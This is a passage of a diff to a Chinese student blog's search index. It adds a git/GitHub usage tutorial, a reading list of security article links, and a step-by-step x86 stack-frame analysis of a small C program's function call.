@@ -1,6 +1,119 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>github使用技巧</title>
+    <url>/2021/01/26/github%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
+    <content><![CDATA[<h1 id="初始化的一些东西"><a href="#初始化的一些东西" class="headerlink" title="初始化的一些东西"></a>初始化的一些东西</h1><p>首先主要是借鉴了<a href="https://www.cnblogs.com/smilejinge/p/3589479.html" target="_blank" rel="noopener">这篇文章</a></p>
+<h2 id="关于密钥"><a href="#关于密钥" class="headerlink" title="关于密钥"></a>关于密钥</h2><p>先生成密钥</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;your_email@qq.com&quot;</span><br></pre></td></tr></table></figure>
+
+<p>接着复制</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.ssh&#x2F;id_rsa.pub</span><br></pre></td></tr></table></figure>
+
+<p>粘贴到github的密钥里</p>
+<h2 id="关于用户名和邮箱"><a href="#关于用户名和邮箱" class="headerlink" title="关于用户名和邮箱"></a>关于用户名和邮箱</h2><p><img src="/2021/01/26/github%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/1-1.png" alt="1-1"></p>
+<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><ol>
+<li><p>在合适的地方建一个目录</p>
+</li>
+<li><p>进入所创建的目录，然后将该目录变为Git可以管理的仓库，命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git init</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>进入本地仓库目录，可查看本地仓库目录的状态，命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>远程初始一个Git仓库，命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git --bare init</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>添加远程地址，设置GitHub的仓库地址并取名为origin【也可以取名为自定义】，命令如下：【yourRepo是你在github上建好的仓库】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git remote add origin git@github.com:yourName&#x2F;yourRepo.git</span><br></pre></td></tr></table></figure>
+
+<p>上条命令中的yourName和yourRepo表示你在GitHub中的用户名和前面在GitHub中所新建的仓库的名称，添加完之后进入.git，打开config，这里会多出一个remote “origin”内容，这就是刚才添加的远程地址，也可以直接修改config来配置远程地址。</p>
+</li>
+</ol>
+<h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h2><p><img src="/2021/01/26/github%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/1-2.png" alt="1-2"></p>
+<blockquote>
+<p>git push命令会将本地仓库中的内容推送到远程服务器上。</p>
+<p>修改完代码后，使用git status可以查看文件的差别；</p>
+<p>使用git add 添加要commit的文件，也可以用git add -i来智能添加文件，git add -A添加所有文件；</p>
+<p>之后使用git commit提交本次修改；</p>
+<p>最后使用git push上传到github。</p>
+</blockquote>
+<h2 id="git工作区、暂存区和版本库"><a href="#git工作区、暂存区和版本库" class="headerlink" title="git工作区、暂存区和版本库"></a>git工作区、暂存区和版本库</h2><p><a href="https://www.runoob.com/git/git-workspace-index-repo.html" target="_blank" rel="noopener">参考文章</a></p>
+<img src="/2021/01/26/github%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/gitblog\1\source\_posts\github使用技巧\1-3.png" alt="1-3" style="zoom:150%;">
+
+
+
+
+
+<h2 id="git将github上内容clone到本地仓库"><a href="#git将github上内容clone到本地仓库" class="headerlink" title="git将github上内容clone到本地仓库"></a>git将github上内容clone到本地仓库</h2><p>克隆仓库的命令格式为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone &lt;repo&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果我们需要克隆到指定的目录，可以使用以下命令格式：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone &lt;repo&gt; &lt;directory&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="基本操作汇总"><a href="#基本操作汇总" class="headerlink" title="基本操作汇总"></a>基本操作汇总</h2><p><a href="https://www.runoob.com/git/git-basic-operations.html" target="_blank" rel="noopener">参考文章</a></p>
+<p><img src="/2021/01/26/github%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/1-4.jpg" alt="1-4"></p>
+<h2 id="分支有关操作"><a href="#分支有关操作" class="headerlink" title="分支有关操作"></a>分支有关操作</h2><p><img src="/2021/01/26/github%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/1-4.png" alt="1-4"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git branch			&#x2F;&#x2F;查看分支</span><br><span class="line">git branch &lt;name&gt;			&#x2F;&#x2F;创建名字为name的分支</span><br><span class="line">git checkout &lt;name&gt;			&#x2F;&#x2F;切换到名字为name的分支</span><br><span class="line">git branch -d &lt;name&gt;			&#x2F;&#x2F;删除名字为name的分支</span><br><span class="line">git branch -b &lt;name&gt;			&#x2F;&#x2F;创建名字为name的新分支并且切换到该分支下</span><br></pre></td></tr></table></figure>
+
+<p>分支的内容为创建时工作区里的内容，上图中为test1和test2。</p>
+<p><img src="/2021/01/26/github%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/1-5.png" alt="1-5"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git merge &lt;name&gt;			&#x2F;&#x2F;将名字为name的分支融合到master上</span><br><span class="line">有冲突的话会要求你手动消除冲突。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log			&#x2F;&#x2F;查看历史</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.runoob.com/git/git-commit-history.html" target="_blank" rel="noopener">gitlog有关命令</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git tag -a v1.0 </span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.runoob.com/git/git-tag.html" target="_blank" rel="noopener">gittag有关命令</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>环境安装</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>环境搭建中的一些问题</title>
+    <url>/2021/01/22/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>安全文章浏览记录</title>
+    <url>/2021/01/14/%E5%AE%89%E5%85%A8%E6%96%87%E7%AB%A0%E6%B5%8F%E8%A7%88%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h1 id="2021年"><a href="#2021年" class="headerlink" title="2021年"></a>2021年</h1><h2 id="1月"><a href="#1月" class="headerlink" title="1月"></a>1月</h2><h3 id="14号"><a href="#14号" class="headerlink" title="14号"></a>14号</h3><ol>
+<li><a href="https://cloud.tencent.com/developer/article/1371906" target="_blank" rel="noopener">preg_replace漏洞</a></li>
+<li><a href="https://blog.csdn.net/rfrder/article/details/109723519" target="_blank" rel="noopener">preg_replace漏洞2</a></li>
+</ol>
+<h3 id="19号"><a href="#19号" class="headerlink" title="19号"></a>19号</h3><ol>
+<li><a href="https://xz.aliyun.com/t/6050" target="_blank" rel="noopener">ssrf me【代码审计】</a></li>
+</ol>
+<h3 id="21号"><a href="#21号" class="headerlink" title="21号"></a>21号</h3><ol>
+<li><a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks" target="_blank" rel="noopener">md5扩展【纯英文】</a></li>
+<li><a href="https://www.freebuf.com/articles/web/69264.html" target="_blank" rel="noopener">hash长度扩展攻击</a></li>
+</ol>
+<h3 id="24号"><a href="#24号" class="headerlink" title="24号"></a>24号</h3><ol>
+<li><a href="https://www.jianshu.com/p/e1403b7140fa" target="_blank" rel="noopener">python【BeautifulSoup库】</a></li>
+</ol>
+<h3 id="25号"><a href="#25号" class="headerlink" title="25号"></a>25号</h3><ol>
+<li><a href="https://blog.csdn.net/c406495762/article/details/72331737" target="_blank" rel="noopener">Selenium与python爬虫</a></li>
+</ol>
+<h3 id="26号"><a href="#26号" class="headerlink" title="26号"></a>26号</h3><ol>
+<li><a href="https://www.cnblogs.com/smilejinge/p/3589479.html" target="_blank" rel="noopener">github简单使用</a></li>
+</ol>
+]]></content>
+  </entry>
+  <entry>
     <title>模电期末复习</title>
     <url>/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="第一章：直流电路"><a href="#第一章：直流电路" class="headerlink" title="第一章：直流电路"></a>第一章：直流电路</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/1-1.png" alt="1-1"></p>
@@ -656,9 +769,674 @@ Son mygs = <span class="keyword">new</span> grandSon();</code></pre>
 <p>OF（overflow flag）：溢出标志位。这个位是用来判断有没有溢出的。注意溢出这个概念只对于有符号数据而言，就如同进位只对于无符号数据而言。当OF=0时，说明没有溢出；当OF=1时，说明溢出了。</p>
 </blockquote>
 <h2 id="指令寄存器"><a href="#指令寄存器" class="headerlink" title="指令寄存器"></a>指令寄存器</h2><p>EIP【Instruction Pointer】：CPU每执行完一条指令，就通过EIP寄存器读取并执行下一条命令。</p>
+<h1 id="对一个简单程序的栈帧分析"><a href="#对一个简单程序的栈帧分析" class="headerlink" title="对一个简单程序的栈帧分析"></a>对一个简单程序的栈帧分析</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">add</span><span class="params">(<span class="keyword">long</span> a, <span class="keyword">long</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> x = a, y = b;</span><br><span class="line">    <span class="keyword">return</span> (x + y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> a = <span class="number">1</span>, b = <span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, add(a, b));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在栈中，EBP作为栈底，ESP作为栈顶，EIP为指令指针。</p>
+<p>刚开始的寄存器和栈是这样的：</p>
+<p><img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/2-1.png" alt="2-1"></p>
+<p><img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/2-2.png" alt="2-2"></p>
+<p>1.从入口main函数进去，先配置好栈底和栈顶指针</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push EBP</span><br><span class="line">mov EBP,ESP</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>此时，可以在栈窗口这样设置相对地址</p>
+<p><img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/2-3.png" alt="2-3"></p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th>内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF28</td>
+<td>EBP</td>
+<td>0019FF70【执行main函数前EBP的地址】</td>
+<td>EBP，ESP</td>
+</tr>
+</tbody></table>
+<p>2.将栈顶向地址小的地方移动8个字节，来给main函数里的a，b变量分配空间</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SUB ESP,8</span><br></pre></td></tr></table></figure>
+
+<p>然后赋值</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">long a &#x3D; 1, b &#x3D; 2;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MOV DWORD PTR SS:[EBP-4],1			&#x2F;&#x2F;a</span><br><span class="line">MOV DWORD PTR SS:[EBP-8],2			&#x2F;&#x2F;b</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th>内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF20</td>
+<td>EBP-8</td>
+<td>2</td>
+<td>ESP</td>
+</tr>
+<tr>
+<td>0019FF24</td>
+<td>EBP-4</td>
+<td>1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF28</td>
+<td>EBP</td>
+<td>0019FF70【执行main函数前EBP的地址】</td>
+<td>EBP</td>
+</tr>
+</tbody></table>
+<p>3.调用add(a,b)函数，首先要传递参数a和b，这里是使用了EAX和ECX寄存器</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MOV EAX,DWORD PTR SS:[EBP-8]</span><br><span class="line">PUSH EAX                                 ; Arg2 &#x3D;&gt; 2</span><br><span class="line">MOV ECX,DWORD PTR SS:[EBP-4]             </span><br><span class="line">PUSH ECX                                 ; Arg1 &#x3D;&gt; 1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>ps：这里先压入了b，再压入a,遵循从右向左压入函数的规则</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th>内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF18</td>
+<td>EBP-10</td>
+<td>1</td>
+<td>ESP</td>
+</tr>
+<tr>
+<td>0019FF1C</td>
+<td>EBP-C</td>
+<td>2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF20</td>
+<td>EBP-8</td>
+<td>2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF24</td>
+<td>EBP-4</td>
+<td>1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF28</td>
+<td>EBP</td>
+<td>0019FF70【执行main函数前EBP的地址】</td>
+<td>EBP</td>
+</tr>
+</tbody></table>
+<p>4.用CALL调用的add函数，调用的同时会把返回地址压入栈中，返回地址指的是CALL语句的下一条语句。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0040103C    CALL 00401000</span><br><span class="line">00401041    ADD ESP,8			&#x2F;&#x2F;call的下一句【非调用内容】</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th>内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF14</td>
+<td>EBP-14</td>
+<td>00401041【call线性关系上的下一条语句】</td>
+<td>ESP</td>
+</tr>
+<tr>
+<td>0019FF18</td>
+<td>EBP-10</td>
+<td>1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF1C</td>
+<td>EBP-C</td>
+<td>2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF20</td>
+<td>EBP-8</td>
+<td>2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF24</td>
+<td>EBP-4</td>
+<td>1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF28</td>
+<td>EBP</td>
+<td>0019FF70【执行main函数前EBP的地址】</td>
+<td>EBP</td>
+</tr>
+</tbody></table>
+<p>5.将执行main函数时EBP值压入栈，并新生成执行add函数时的栈帧</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUSH EBP</span><br><span class="line">MOV EBP,ESP</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th>内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF10</td>
+<td>EBP</td>
+<td>0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
+<td>EBP，ESP</td>
+</tr>
+<tr>
+<td>0019FF14</td>
+<td>EBP+4</td>
+<td>00401041【call线性关系上的下一条语句】</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF18</td>
+<td>EBP+8</td>
+<td>1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF1C</td>
+<td>EBP+C</td>
+<td>2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF20</td>
+<td>EBP+10</td>
+<td>2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF24</td>
+<td>EBP+14</td>
+<td>1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF28</td>
+<td>EBP+18</td>
+<td>0019FF70【执行main函数前EBP的地址】</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>6.先分配8个字节给两个long类型变量x和y，再将参数a，b的值分别赋给它们。【因为push参数时是从右往左，那么调用时先调用靠近栈顶的元素代表从左往右调用】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">long x&#x3D;a,y&#x3D;b;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00401003  SUB ESP,8</span><br><span class="line">00401006  MOV EAX,DWORD PTR SS:[EBP+8]</span><br><span class="line">00401009  MOV DWORD PTR SS:[EBP-8],EAX</span><br><span class="line">0040100C  MOV ECX,DWORD PTR SS:[EBP+0C]</span><br><span class="line">0040100F  MOV DWORD PTR SS:[EBP-4],ECX</span><br><span class="line">&#x2F;&#x2F;EAX&#x3D;1，ECX&#x3D;2</span><br><span class="line">&#x2F;&#x2F;赋值顺序似乎是按照传参的顺序，在栈中的顺序赋值和参数上下相同【EBP-8，EBP-4和EBP+8，EBP+0C】</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th align="left">内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF08</td>
+<td>EBP-8</td>
+<td align="left">1</td>
+<td>ESP</td>
+</tr>
+<tr>
+<td>0019FF0C</td>
+<td>EBP-4</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF10</td>
+<td>EBP</td>
+<td align="left">0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
+<td>EBP</td>
+</tr>
+<tr>
+<td>0019FF14</td>
+<td>EBP+4</td>
+<td align="left">00401041【call线性关系上的下一条语句】</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF18</td>
+<td>EBP+8</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF1C</td>
+<td>EBP+C</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF20</td>
+<td>EBP+10</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF24</td>
+<td>EBP+14</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF28</td>
+<td>EBP+18</td>
+<td align="left">0019FF70【执行main函数前EBP的地址】</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>6.计算x+y</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00401012  MOV EAX,DWORD PTR SS:[EBP-8]		&#x2F;&#x2F;先调用栈顶的</span><br><span class="line">00401015  ADD EAX,DWORD PTR SS:[EBP-4]</span><br><span class="line">&#x2F;&#x2F;EAX&#x3D;x+y&#x3D;1+2&#x3D;3</span><br></pre></td></tr></table></figure>
+
+
+
+<p>7.将ESP指向EBP的地址，即从这时开始，局部变量x和y将不再有效</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00401018  MOV ESP,EBP</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th align="left">内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF08</td>
+<td>EBP-8</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF0C</td>
+<td>EBP-4</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF10</td>
+<td>EBP</td>
+<td align="left">0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
+<td>EBP，ESP</td>
+</tr>
+<tr>
+<td>0019FF14</td>
+<td>EBP+4</td>
+<td align="left">00401041【call线性关系上的下一条语句】</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF18</td>
+<td>EBP+8</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF1C</td>
+<td>EBP+C</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF20</td>
+<td>EBP+10</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF24</td>
+<td>EBP+14</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF28</td>
+<td>EBP+18</td>
+<td align="left">0019FF70【执行main函数前EBP的地址】</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>8.弹出栈顶元素【main函数的EBP地址】并且赋值给EBP，此时就完全删除了栈帧</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POP EBP</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th align="left">内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF08</td>
+<td>EBP-8</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF0C</td>
+<td>EBP-4</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF10</td>
+<td>EBP</td>
+<td align="left">0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF14</td>
+<td>EBP+4</td>
+<td align="left">00401041【call线性关系上的下一条语句】</td>
+<td>ESP</td>
+</tr>
+<tr>
+<td>0019FF18</td>
+<td>EBP+8</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF1C</td>
+<td>EBP+C</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF20</td>
+<td>EBP+10</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF24</td>
+<td>EBP+14</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF28</td>
+<td>EBP+18</td>
+<td align="left">0019FF70【执行main函数前EBP的地址】</td>
+<td>EBP</td>
+</tr>
+</tbody></table>
+<p>9.RETN相当于弹出栈顶的地址，并JMP过去</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RETN</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th align="left">内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF08</td>
+<td>EBP-8</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF0C</td>
+<td>EBP-4</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF10</td>
+<td>EBP</td>
+<td align="left">0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF14</td>
+<td>EBP+4</td>
+<td align="left">00401041【call线性关系上的下一条语句】</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF18</td>
+<td>EBP+8</td>
+<td align="left">1</td>
+<td>ESP</td>
+</tr>
+<tr>
+<td>0019FF1C</td>
+<td>EBP+C</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF20</td>
+<td>EBP+10</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF24</td>
+<td>EBP+14</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF28</td>
+<td>EBP+18</td>
+<td align="left">0019FF70【执行main函数前EBP的地址】</td>
+<td>EBP</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>此时EIP就是00401041</p>
+</blockquote>
+<p>10.由于add函数已经调用结束，也就不需要参数a和b了，所以将它们清理掉</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ADD ESP，8</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th align="left">内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF08</td>
+<td>EBP-8</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF0C</td>
+<td>EBP-4</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF10</td>
+<td>EBP</td>
+<td align="left">0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF14</td>
+<td>EBP+4</td>
+<td align="left">00401041【call线性关系上的下一条语句】</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF18</td>
+<td>EBP+8</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF1C</td>
+<td>EBP+C</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF20</td>
+<td>EBP+10</td>
+<td align="left">2</td>
+<td>ESP</td>
+</tr>
+<tr>
+<td>0019FF24</td>
+<td>EBP+14</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF28</td>
+<td>EBP+18</td>
+<td align="left">0019FF70【执行main函数前EBP的地址】</td>
+<td>EBP</td>
+</tr>
+</tbody></table>
+<p>11.调用printf()函数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00401044  PUSH EAX</span><br><span class="line">00401045  PUSH OFFSET 0040B384                     ; ASCII &quot;%d</span><br><span class="line">0040104A  CALL 00401067</span><br><span class="line">0040104F  ADD ESP,8</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">printf(&quot;%d\n&quot;,add(a,b));</span><br></pre></td></tr></table></figure>
+
+<p>printf有两个参数，一个是”%d\n”，另一个是add(a,b)的返回值。</p>
+<p>所以从右往左依次压入这些参数，随后调用。</p>
+<p>调用完成后，按规矩清理这两个参数。</p>
+<p>最后栈变成这样：</p>
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th align="left">内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF08</td>
+<td>EBP-8</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF0C</td>
+<td>EBP-4</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF10</td>
+<td>EBP</td>
+<td align="left">0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF14</td>
+<td>EBP+4</td>
+<td align="left">00401041【call线性关系上的下一条语句】</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF18</td>
+<td>EBP+8</td>
+<td align="left">0040B384</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF1C</td>
+<td>EBP+C</td>
+<td align="left">3</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF20</td>
+<td>EBP+10</td>
+<td align="left">2</td>
+<td>ESP</td>
+</tr>
+<tr>
+<td>0019FF24</td>
+<td>EBP+14</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF28</td>
+<td>EBP+18</td>
+<td align="left">0019FF70【执行main函数前EBP的地址】</td>
+<td>EBP</td>
+</tr>
+</tbody></table>
+<p>12.设置返回值0</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">return 0;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">XOR EAX，EAX</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>为什么不用<code>MOV EAX，0</code>？</p>
+<p>XOR EAX，EAX执行速度快一些</p>
+</blockquote>
+<p>13.删除main函数的栈帧</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MOV ESP，EBP</span><br><span class="line">POP EBP</span><br></pre></td></tr></table></figure>
+
+<p>之后EBP又指向执行main函数之前EBP地址，一切恢复如初。</p>
+<h1 id="三种函数调用方式"><a href="#三种函数调用方式" class="headerlink" title="三种函数调用方式"></a>三种函数调用方式</h1><h2 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h2><ol>
+<li><p>函数的参数以逆序压入栈【从右向左】</p>
+</li>
+<li><p>调用函数RETN后，在调用者函数中</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ADD ESP，n</span><br></pre></td></tr></table></figure>
+
+<p>来清理栈</p>
+</li>
+</ol>
+<h2 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h2><ol>
+<li><p>清理栈的任务交给了被调用者函数，在函数返回时</p>
